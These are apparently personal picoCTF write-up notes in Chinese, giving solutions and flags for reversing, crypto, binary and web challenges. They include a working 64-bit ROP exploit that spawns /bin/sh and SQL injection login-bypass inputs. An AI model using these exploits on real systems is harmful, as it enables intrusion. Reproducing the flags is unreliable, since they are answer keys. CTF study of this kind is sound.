`account_balance = account_balance - total_cost` = `1100 - total_cost` 再 overflow

把輸入調小一點 就會過了

### code
```c++
#include <stdio.h>
#include <stdlib.h>
int main()
{
    setbuf(stdout, NULL);
    int con;
    con = 0;
    int account_balance = 1100;
    while(con == 0){

        printf("Welcome to the flag exchange\n");
        printf("We sell flags\n");

        printf("\n1. Check Account Balance\n");
        printf("\n2. Buy Flags\n");
        printf("\n3. Exit\n");
        int menu;
        printf("\n Enter a menu selection\n");
        fflush(stdin);
        scanf("%d", &menu);
        if(menu == 1){
            printf("\n\n\n Balance: %d \n\n\n", account_balance);
        }
        else if(menu == 2){
            printf("Currently for sale\n");
            printf("1. Defintely not the flag Flag\n");
            printf("2. 1337 Flag\n");
            int auction_choice;
            fflush(stdin);
            scanf("%d", &auction_choice);
            if(auction_choice == 1){
                printf("These knockoff Flags cost 900 each, enter desired quantity\n");

                int number_flags = 0;
                fflush(stdin);
                scanf("%d", &number_flags);
                if(number_flags > 0){
                    int total_cost = 0;
                    total_cost = 900*number_flags;
                    printf("\nThe final cost is: %d\n", total_cost);
                    if(total_cost <= account_balance){
                        account_balance = account_balance - total_cost;
                        printf("\nYour current balance after transaction: %d\n\n", account_balance);
                    }
                    else{
                        printf("Not enough funds to complete purchase\n");
                    }


                }




            }
            else if(auction_choice == 2){
                printf("1337 flags cost 100000 dollars, and we only have 1 in stock\n");
                printf("Enter 1 to buy one");
                int bid = 0;
                fflush(stdin);
                scanf("%d", &bid);

                if(bid == 1){

                    if(account_balance > 100000){
                        FILE *f = fopen("flag.txt", "r");
                        if(f == NULL){

                            printf("flag not found: please run this on the server\n");
                            exit(0);
                        }
                        char buf[64];
                        fgets(buf, 63, f);
                        printf("YOUR FLAG IS: %s\n", buf);
                        }

                    else{
                        printf("\nNot enough funds for transaction\n\n\n");
                    }}

            }
        }
        else{
            con = 1;
        }

    }
    return 0;
}
```

picoCTF{m0n3y_bag5_e062f0fd}
## asm3 - Points: 300 - (Solves: 677)Reverse Engineering
## code
```
global _start

_start:

	push   ebp
	mov    ebp,esp
  push 0xad761175
  push 0xb5a06caa
	push 0xc264bd5c
  call asm3
	nop
	leave
	ret

asm3:
  push   ebp
	mov    ebp,esp
	xor    eax,eax
	mov    ah,BYTE [ebp+0x9]
	shl    ax,0x10
	sub    al,BYTE [ebp+0xd]
	add    ah,BYTE [ebp+0xf]
	xor    ax,WORD [ebp+0x10]
	nop
	pop    ebp
	ret

```
> nasm -f elf -o a.o a.asm
> ld -o a a.o -m elf_i386
>
之後用 gdb 看 eax

picoCTF{0xa4e1}
## Tapping - Points: 200 - (Solves: 4189)Cryptography

### review
`.--. .. -.-. --- -.-. - ..-. { -- ----- .-. ... ...-- -.-. ----- -.. ...-- .---- ... ..-. ..- -. ----. ----- ...-- .---- ....- ----- ....- ....- ---.. }`
PICOCTF{M0RS3C0D31SFUN903140448}

## vault-door-8 - Points: 450 - (Solves: 1316)Reverse Engineering
### code
原本的code
```
// These pesky special agents keep reverse engineering our source code and then
// breaking into our secret vaults. THIS will teach those sneaky sneaks a
// lesson.
//
// -Minion #0891
import java.util.*;
import javax.crypto.Cipher;
import javax.crypto.spec.SecretKeySpec;
import java.security.*;
class VaultDoor8 {
 public static void main(String args[]) {
  Scanner b = new Scanner(System.in);
  System.out.print("Enter vault password: ");
  String c = b.next();
  String f = c.substring(8, c.length() - 1);
  VaultDoor8 a = new VaultDoor8();
  if (a.checkPassword(f)) {
   System.out.println("Access granted.");
  } else {
   System.out.println("Access denied!");
  }
 }
 public char[] scramble(String password) {
  /* Scramble a password by transposing pairs of bits. */
  char[] a = password.toCharArray();
  for (int b = 0; b < a.length; b++) {
   char c = a[b];
   c = switchBits(c, 1, 2);
   c = switchBits(c, 0, 3); /* c = switchBits(c,14,3); c = switchBits(c, 2, 0); */
   c = switchBits(c, 5, 6);
   c = switchBits(c, 4, 7);
   c = switchBits(c, 0, 1); /* d = switchBits(d, 4, 5); e = switchBits(e, 5, 6); */
   c = switchBits(c, 3, 4);
   c = switchBits(c, 2, 5);
   c = switchBits(c, 6, 7);
   a[b] = c;
  }
  return a;
 }
 public char switchBits(char c, int p1, int p2) {
  /* Move the bit in position p1 to position p2, and move the bit
  that was in position p2 to position p1. Precondition: p1 < p2 */
  char mask1 = (char)(1 << p1);
  char mask2 = (char)(1 << p2); /* char mask3 = (char)(1<<p1<<p2); mask1++; mask1--; */
  char bit1 = (char)(c & mask1);
  char bit2 = (char)(c & mask2);
  /* System.out.println("bit1 " + Integer.toBinaryString(bit1));
System.out.println("bit2 " + Integer.toBinaryString(bit2)); */
  char rest = (char)(c & ~(mask1 | mask2));
  char shift = (char)(p2 - p1);
  char result = (char)((bit1 << shift) | (bit2 >> shift) | rest);
  return result;
 }
 public boolean checkPassword(String password) {
  char[] scrambled = scramble(password);
  char[] expected = {
   0xF4,
   0xC0,
   0x97,
   0xF0,
   0x77,
   0x97,
   0xC0,
   0xE4,
   0xF0,
   0x77,
   0xA4,
   0xD0,
   0xC5,
   0x77,
   0xF4,
   0x86,
   0xD0,
   0xA5,
   0x45,
   0x96,
   0x27,
   0xB5,
   0x77,
   0xE1,
   0xC0,
   0xA4,
   0x95,
   0x94,
   0xD1,
   0x95,
   0x94,
   0xD0
  };
  return Arrays.equals(scrambled, expected);
 }
}

```
就調用原版的code
改一改
一開始我用python 寫 那個函數不知道在幹嘛 = =
我是ascii 轉 binary 然後bit 交換 我看code應該是這樣
自己實作搞不出來
```
import java.util.*;
import javax.crypto.Cipher;
import javax.crypto.spec.SecretKeySpec;
import java.security.*;
public class Main
{
	public static void main(String[] args) {

	   //char[] a = password.toCharArray();
	   char[]a={
   0xF4,
   0xC0,
   0x97,
   0xF0,
   0x77,
   0x97,
   0xC0,
   0xE4,
   0xF0,
   0x77,
   0xA4,
   0xD0,
   0xC5,
   0x77,
   0xF4,
   0x86,
   0xD0,
   0xA5,
   0x45,
   0x96,
   0x27,
   0xB5,
   0x77,
   0xE1,
   0xC0,
   0xA4,
   0x95,
   0x94,
   0xD1,
   0x95,
   0x94,
   0xD0
  };
      for (int b = 0; b < a.length; b++) {
       char c = a[b];
       c = switchBits(c, 6, 7);
       c = switchBits(c, 2, 5);
       c = switchBits(c, 3, 4);
       c = switchBits(c, 0, 1); /* d = switchBits(d, 4, 5); e = switchBits(e, 5, 6); */
       c = switchBits(c, 4, 7);
       c = switchBits(c, 5, 6);
       c = switchBits(c, 0, 3); /* c = switchBits(c,14,3); c = switchBits(c, 2, 0); */
       c = switchBits(c, 1, 2);
       a[b] = c;
      }


	   // String password="CYH";
	   // char ret=switchBits('h',1,2);
	    System.out.println(a);
// 		System.out.println("Hello World");
	}
	public static char switchBits(char c, int p1, int p2) {
  /* Move the bit in position p1 to position p2, and move the bit
  that was in position p2 to position p1. Precondition: p1 < p2 */
  char mask1 = (char)(1 << p1);
  char mask2 = (char)(1 << p2); /* char mask3 = (char)(1<<p1<<p2); mask1++; mask1--; */
  char bit1 = (char)(c & mask1);
  char bit2 = (char)(c & mask2);
  /* System.out.println("bit1 " + Integer.toBinaryString(bit1));
System.out.println("bit2 " + Integer.toBinaryString(bit2)); */
  char rest = (char)(c & ~(mask1 | mask2));
  char shift = (char)(p2 - p1);
  char result = (char)((bit1 << shift) | (bit2 >> shift) | rest);
  return result;
 }
}
```
*失敗的python*
```python=
arr=[0xF4,
   0xC0,
   0x97,
   0xF0,
   0x77,
   0x97,
   0xC0,
   0xE4,
   0xF0,
   0x77,
   0xA4,
   0xD0,
   0xC5,
   0x77,
   0xF4,
   0x86,
   0xD0,
   0xA5,
   0x45,
   0x96,
   0x27,
   0xB5,
   0x77,
   0xE1,
   0xC0,
   0xA4,
   0x95,
   0x94,
   0xD1,
   0x95,
   0x94,
   0xD0]
bit=[]
# for i in arr:
    # print(bin(i)[2:])

    # bit.append(list(bin(i)[2:]))
# print(bit)
# print(len(bit))
# 手動補0
bit=['11110100',
'11000000',
'10010111',
'11110000',
'01110111',
'10010111',
'11000000',
'11100100',
'11110000',
'01110111',
'10100100',
'11010000',
'11000101',
'01110111',
'11110100',
'10000110',
'11010000',
'10100101',
'01000101',
'10010110',
'00100111',
'10110101',
'01110111',
'11100001',
'11000000',
'10100100',
'10010101',
'10010100',
'11010001',
'10010101',
'11010000',
'10010100']
def swit(data_in, p1, p2):
    data_in = data_in[::-1]
    tmp_in = list(data_in)
    tmp = tmp_in[p1]
    tmp_in[p1] = tmp_in[p2]
    tmp_in[p2] = tmp
    ret = "".join(tmp_in)
    ret = ret[::-1]
    print(data_in[::-1],ret)
    return ret
for i in bit:
    i=swit(i, 6, 7)
    i=swit(i, 2, 5)
    i=swit(i, 3, 4)
    i=swit(i, 0, 1)
    i=swit(i, 4, 7)
    i=swit(i, 5, 6)
    i=swit(i, 0, 3)
    i=swit(i, 1, 2)
# print(type(bit[0]))
for i in bit:
    print(chr(int(i,2)))
```
picoCTF{s0m3_m0r3_b1t_sh1fTiNg_60bea5ea1}
## Need For Speed - Points: 400 - (Solves: 551)Reverse Engineering
### code
以為多難 丟gdb就看出來了
```
[----------------------------------registers-----------------------------------]
RAX: 0x37 ('7')
RBX: 0x0
RCX: 0x0
RDX: 0x0
RSI: 0x555555756260 ("Printing flag:\n\n", '=' <repeats 12 times>, "\n")
RDI: 0x555555755020 ("PICOCTF{Good job keeping bus #3044d295 speeding along!}")
RBP: 0x7fffffffdf50 --> 0x7fffffffdf70 --> 0x5555555549c0 (<__libc_csu_init>:	push   r15)
RSP: 0x7fffffffdf50 --> 0x7fffffffdf70 --> 0x5555555549c0 (<__libc_csu_init>:	push   r15)
RIP: 0x55555555492a (<print_flag+36>:	call   0x555555554650 <puts@plt>)
R8 : 0x7ffff7fac500 (0x00007ffff7fac500)
R9 : 0x7ffff7fa5848 --> 0x7ffff7fa5760 --> 0xfbad2a84
R10: 0x8
R11: 0x246
R12: 0x5555555546b0 (<_start>:	xor    ebp,ebp)
R13: 0x7fffffffe050 --> 0x1
R14: 0x0
R15: 0x0
EFLAGS: 0x202 (carry parity adjust zero sign trap INTERRUPT direction overflow)
[-------------------------------------code-------------------------------------]
   0x55555555491c <print_flag+22>:	mov    edi,eax
   0x55555555491e <print_flag+24>:	call   0x5555555547ba <decrypt_flag>
   0x555555554923 <print_flag+29>:	lea    rdi,[rip+0x2006f6]        # 0x555555755020 <flag>
=> 0x55555555492a <print_flag+36>:	call   0x555555554650 <puts@plt>
   0x55555555492f <print_flag+41>:	nop
   0x555555554930 <print_flag+42>:	pop    rbp
   0x555555554931 <print_flag+43>:	ret    
   0x555555554932 <header>:	push   rbp
Guessed arguments:
arg[0]: 0x555555755020 ("PICOCTF{Good job keeping bus #3044d295 speeding along!}")
[------------------------------------stack-------------------------------------]
0000| 0x7fffffffdf50 --> 0x7fffffffdf70 --> 0x5555555549c0 (<__libc_csu_init>:	push   r15)
0008| 0x7fffffffdf58 --> 0x5555555549ab (<main+55>:	mov    eax,0x0)
0016| 0x7fffffffdf60 --> 0x7fffffffe058 --> 0x7fffffffe3a4 ("/home/user/Desktop/todo/need-for-speed")
0024| 0x7fffffffdf68 --> 0x100000000
0032| 0x7fffffffdf70 --> 0x5555555549c0 (<__libc_csu_init>:	push   r15)
0040| 0x7fffffffdf78 --> 0x7ffff7de6b6b (<__libc_start_main+235>:	mov    edi,eax)
0048| 0x7fffffffdf80 --> 0x0
0056| 0x7fffffffdf88 --> 0x7fffffffe058 --> 0x7fffffffe3a4 ("/home/user/Desktop/todo/need-for-speed")
[------------------------------------------------------------------------------]
Legend: code, data, rodata, value
0x000055555555492a in print_flag ()
gdb-peda$

```

PICOCTF{Good job keeping bus #3044d295 speeding along!}




## Time's Up - Points: 400 - (Solves: 456)Reverse Engineering
### code
```
from pwn import *
context.log_level = 'DEBUG'
r=process('./times-up')
recv=r.recvuntil('S')
ans=eval(recv[10:-1])
# print(ans)
r.sendline(str(ans))
r.interactive()

```

picoCTF{Gotta go fast. Gotta go FAST. #046cc375}
## rsa-pop-quiz - Points: 200 - (Solves: 1765)Cryptography
### code
```

```
picoCTF{wA8_th4t$_ill3aGal..ob7f0bd39}
## miniRSA - Points: 300 - (Solves: 1319)Cryptography
### review
就是給你題目 給你n e c
因為e很小 n很大
所以有沒有mod n 根本沒差 所以直接爆破

```
import gmpy
n=29331922499794985782735976045591164936683059380558950386560160105740343201513369939006307531165922708949619162698623675349030430859547825708994708321803705309459438099340427770580064400911431856656901982789948285309956111848686906152664473350940486507451771223435835260168971210087470894448460745593956840586530527915802541450092946574694809584880896601317519794442862977471129319781313161842056501715040555964011899589002863730868679527184420789010551475067862907739054966183120621407246398518098981106431219207697870293412176440482900183550467375190239898455201170831410460483829448603477361305838743852756938687673
e=3
c=2205316413931134031074603746928247799030155221252519872650082343781881947286623459260358458095368337105247516735006016223547924074432814737081052371203373104854490121754016011241903971190586239974732476290129461147622505210058893325312869
# i=0
# while 1:
#     if(gmpy.root(c+1*n,3)[1]==1):
#         print gmpy.root(c+1*n,3),i
#         break
#     i=i+1
low=10**78
upp=10**80
v=(low+upp)/2
while 1:
    p=pow(v,3)
    # print(p,'\n\n')
    if p < c:
        low = v
    elif p > c:
        upp = v
    else:
        print v
        print hex(v)
        ans=hex(v)[2:-1]
        print ans
        flag=""
        for i in range(0,len(ans),2):
            # print(int(ans[i:i+2],16))
            flag+=chr(int(ans[i:i+2],16))
        print flag
        break
    v = (low+upp)/2

```
picoCTF{n33d_a_lArg3r_e_db48b19b}



## rop64 - Points: 400 - (Solves: 243)Binary Exploitation
### review
用Ropgadget 就好
不知道為啥 pack 不能用 所以全改成 p64

```
# from struct import pack
from pwn import *
context.log_level = 'DEBUG'
r=process('./vuln')
r.recvuntil('\n')
raw_input(':')
	# Padding goes here
#
p = 'a'*(8*3)
p += p64(0x00000000004100d3) # pop rsi ; ret
p += p64(0x00000000006b90e0) # @ .data
p += p64(0x00000000004156f4) # pop rax ; ret
p += '/bin//sh'
p += p64(0x000000000047f561) # mov qword ptr [rsi], rax ; ret
p += p64(0x00000000004100d3) # pop rsi ; ret
p += p64(0x00000000006b90e8) # @ .data + 8
p += p64(0x0000000000444c50) # xor rax, rax ; ret
p += p64(0x000000000047f561) # mov qword ptr [rsi], rax ; ret
p += p64(0x0000000000400686) # pop rdi; ret
p += p64(0x00000000006b90e0) # @ .data
p += p64(0x00000000004100d3) # pop rsi ; ret
p += p64(0x00000000006b90e8) # @ .data + 8
p += p64(0x00000000004499b5) # pop rdx ; ret
p += p64(0x00000000006b90e8) # @ .data + 8
p += p64(0x0000000000444c50) # xor rax, rax ; ret
p += p64(0x00000000004749c0) # add rax, 1 ; ret
p += p64(0x00000000004749c0) # add rax, 1 ; ret
p += p64(0x00000000004749c0) # add rax, 1 ; ret
p += p64(0x00000000004749c0) # add rax, 1 ; ret
p += p64(0x00000000004749c0) # add rax, 1 ; ret
p += p64(0x00000000004749c0) # add rax, 1 ; ret
p += p64(0x00000000004749c0) # add rax, 1 ; ret
p += p64(0x00000000004749c0) # add rax, 1 ; ret
p += p64(0x00000000004749c0) # add rax, 1 ; ret
p += p64(0x00000000004749c0) # add rax, 1 ; ret
p += p64(0x00000000004749c0) # add rax, 1 ; ret
p += p64(0x00000000004749c0) # add rax, 1 ; ret
p += p64(0x00000000004749c0) # add rax, 1 ; ret
p += p64(0x00000000004749c0) # add rax, 1 ; ret
p += p64(0x00000000004749c0) # add rax, 1 ; ret
p += p64(0x00000000004749c0) # add rax, 1 ; ret
p += p64(0x00000000004749c0) # add rax, 1 ; ret
p += p64(0x00000000004749c0) # add rax, 1 ; ret
p += p64(0x00000000004749c0) # add rax, 1 ; ret
p += p64(0x00000000004749c0) # add rax, 1 ; ret
p += p64(0x00000000004749c0) # add rax, 1 ; ret
p += p64(0x00000000004749c0) # add rax, 1 ; ret
p += p64(0x00000000004749c0) # add rax, 1 ; ret
p += p64(0x00000000004749c0) # add rax, 1 ; ret
p += p64(0x00000000004749c0) # add rax, 1 ; ret
p += p64(0x00000000004749c0) # add rax, 1 ; ret
p += p64(0x00000000004749c0) # add rax, 1 ; ret
p += p64(0x00000000004749c0) # add rax, 1 ; ret
p += p64(0x00000000004749c0) # add rax, 1 ; ret
p += p64(0x00000000004749c0) # add rax, 1 ; ret
p += p64(0x00000000004749c0) # add rax, 1 ; ret
p += p64(0x00000000004749c0) # add rax, 1 ; ret
p += p64(0x00000000004749c0) # add rax, 1 ; ret
p += p64(0x00000000004749c0) # add rax, 1 ; ret
p += p64(0x00000000004749c0) # add rax, 1 ; ret
p += p64(0x00000000004749c0) # add rax, 1 ; ret
p += p64(0x00000000004749c0) # add rax, 1 ; ret
p += p64(0x00000000004749c0) # add rax, 1 ; ret
p += p64(0x00000000004749c0) # add rax, 1 ; ret
p += p64(0x00000000004749c0) # add rax, 1 ; ret
p += p64(0x00000000004749c0) # add rax, 1 ; ret
p += p64(0x00000000004749c0) # add rax, 1 ; ret
p += p64(0x00000000004749c0) # add rax, 1 ; ret
p += p64(0x00000000004749c0) # add rax, 1 ; ret
p += p64(0x00000000004749c0) # add rax, 1 ; ret
p += p64(0x00000000004749c0) # add rax, 1 ; ret
p += p64(0x00000000004749c0) # add rax, 1 ; ret
p += p64(0x00000000004749c0) # add rax, 1 ; ret
p += p64(0x00000000004749c0) # add rax, 1 ; ret
p += p64(0x00000000004749c0) # add rax, 1 ; ret
p += p64(0x00000000004749c0) # add rax, 1 ; ret
p += p64(0x00000000004749c0) # add rax, 1 ; ret
p += p64(0x00000000004749c0) # add rax, 1 ; ret
p += p64(0x00000000004749c0) # add rax, 1 ; ret
p += p64(0x00000000004749c0) # add rax, 1 ; ret
p += p64(0x00000000004749c0) # add rax, 1 ; ret
p += p64(0x00000000004749c0) # add rax, 1 ; ret
p += p64(0x00000000004749c0) # add rax, 1 ; ret
p += p64(0x00000000004749c0) # add rax, 1 ; ret
p += p64(0x0000000000449135) # syscall ; re
print(p)
r.sendline(p)
r.interactive()

```
picoCTF{rOp_t0_b1n_sH_w1tH_n3w_g4dg3t5_7b18513b}





## Irish-Name-Repo 2 - Points: 350 - (Solves: 1600)Web Exploitation
### reivew
又是我最討厭的sqlinj
看網頁有發現他會送debug=0
把它改成1
送出 就可以看到SQL 完整語法
username:admin' --
password:(空)
picoCTF{m0R3_SQL_plz_c1c3dff7}

## Irish-Name-Repo 3 - Points: 400 - (Solves: 1215)Web Exploitation
### review
password:' be 1=1 --
一樣送debug出去
發現它有做替換僅有 英文 符號沒換

in :abcdefghijklmnopqrstuvwxyz
out:nopqrstuvwxyzabcdefghijklm
  
